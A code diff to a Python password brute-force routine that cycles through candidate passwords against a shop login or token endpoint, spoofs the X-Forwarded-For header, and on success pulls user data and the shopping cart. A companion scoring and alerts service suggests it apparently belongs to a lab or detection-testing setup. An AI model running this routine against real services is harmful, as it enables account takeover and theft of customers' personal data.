@@ -38,8 +38,10 @@ def attack(
     first_success_attempt = None
     first_success_time = None
     first_user_info = None
+    first_cart = None
     start = time.time()
 
+    session = requests.Session()
     for i in range(1, attempts + 1):
         pwd = next(pool)
         ip = "10.0.0.1"
@@ -47,7 +49,7 @@ def attack(
 
         token = None
         if use_jwt:
-            login_resp = requests.post(
+            login_resp = session.post(
                 f"{score_base}/api/token",
                 data={"username": user, "password": pwd},
                 timeout=3,
@@ -55,21 +57,19 @@ def attack(
             login_ok = login_resp.status_code == 200
             token = login_resp.json().get("access_token") if login_ok else None
             if token:
-                requests.get(
+                session.get(
                     f"{score_base}/api/alerts",
                     headers={"Authorization": f"Bearer {token}"},
                     timeout=3,
                 )
         else:
-            login_resp = requests.post(
+            login_resp = session.post(
                 f"{shop_url}/login",
                 json={"username": user, "password": pwd},
                 headers={"X-Forwarded-For": ip},
                 timeout=3,
             )
             login_ok = login_resp.status_code == 200
-            if login_ok:
-                token = login_resp.json().get("access_token")
 
         score_payload = {
             "client_ip": ip,
@@ -104,6 +104,18 @@ def attack(
                         print(f"Retrieved user data: {data}")
                 except Exception as exc:
                     print("INFO ERROR:", exc)
+            if first_cart is None:
+                try:
+                    cart_resp = session.get(
+                        f"{shop_url}/cart",
+                        headers={"X-Reauth-Password": pwd},
+                        timeout=3,
+                    )
+                    if cart_resp.status_code == 200:
+                        first_cart = cart_resp.json()
+                        print(f"Retrieved cart: {first_cart}")
+                except Exception as exc:
+                    print("CART ERROR:", exc)
             if first_success_attempt is None:
                 first_success_attempt = i
                 first_success_time = time.time() - start
@@ -119,6 +131,8 @@ def attack(
     print(f"Total elapsed time: {total_time:.2f}s")
     if first_user_info:
         print(f"First user data: {first_user_info}")
+    if first_cart:
+        print(f"First cart: {first_cart}")
 
 
 if __name__ == "__main__":
